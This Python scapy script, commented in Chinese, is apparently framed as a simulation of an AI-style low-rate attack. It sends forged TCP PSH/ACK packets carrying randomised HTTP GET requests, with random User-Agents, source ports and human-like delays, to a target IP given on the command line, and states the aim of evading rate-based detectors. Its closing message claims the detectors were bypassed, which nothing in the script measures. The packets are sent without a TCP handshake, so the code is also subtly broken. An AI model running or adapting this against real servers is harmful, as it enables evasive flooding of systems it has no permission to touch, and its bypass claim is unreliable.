from scapy.all import IP, TCP, Raw, send
import time
import random
import string
import sys

# --- 配置区 ---
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"
TARGET_PORT = 80
ATTACK_ROUNDS = 10

def generate_llm_payload():
    """
    模拟大语言模型 (LLM) 动态生成的极高拟人性载荷。
    这里为了省去调 API 的开销，我们用算法模拟 LLM 生成的高语义熵 HTTP GET 请求。
    每次请求的搜索词、User-Agent 和 URI 路径都完全不同，保证微观熵极高。
    """
    # 模拟 LLM 伪造的不同设备型号
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    ]
    
    # 模拟 LLM 随机组合的复杂查询语义
    search_topics = ["how+to+cook+pasta", "latest+ai+news+2026", "rtx+3080+ti+benchmark", "weather+in+tokyo", "quantum+computing+tutorial"]
    
    uri = f"/search?q={random.choice(search_topics)}&session={random.randint(1000,9999)}"
    ua = random.choice(user_agents)
    
    # 构造合法的 HTTP GET 报文
    payload = f"GET {uri} HTTP/1.1\r\nHost: {TARGET_IP}\r\nUser-Agent: {ua}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n"
    return payload

def generate_human_delay():
    """
    模拟 LLM 赋予的拟人化延迟 (Inter-Packet Arrival Time)。
    打破机械化发包的固定频率，完美融入 TCP 拥塞控制和真实延迟的长尾分布。
    """
    # 模拟人类阅读网页的停顿：1 到 4 秒的随机非线性延迟
    return random.uniform(1.0, 4.0)

print(f"[*] 启动基于 LLM 范式的分布式低速率攻击模拟...")
print(f"[*] 目标: {TARGET_IP}:{TARGET_PORT}")

for i in range(ATTACK_ROUNDS):
    print(f"\n[+] 准备发送第 {i+1} 个突发流...")
    
    # 1. LLM 思考并生成攻击载荷
    payload_str = generate_llm_payload()
    print(f"    生成的载荷微观特征 (前50字符): {payload_str[:50]}...")
    
    # 2. 构造底层网络包 (IP + TCP + Payload)
    # 注意：这里我们随机化了源端口 (sport)，模拟不同的 TCP 会话
    packet = IP(dst=TARGET_IP)/TCP(sport=random.randint(1024, 65535), dport=TARGET_PORT, flags="PA")/Raw(load=payload_str)
    
    # 3. 发送数据包 (由于我们需要底层发包权限，稍后运行需要 sudo)
    send(packet, verbose=False)
    
    # 4. LLM 模拟的拟人休眠
    sleep_time = generate_human_delay()
    print(f"    [-] LLM 模拟人类阅读休眠: {sleep_time:.2f} 秒...")
    time.sleep(sleep_time)

print("\n[*] 攻击轮次执行完毕。传统速率阈值检测器已被绕过！")
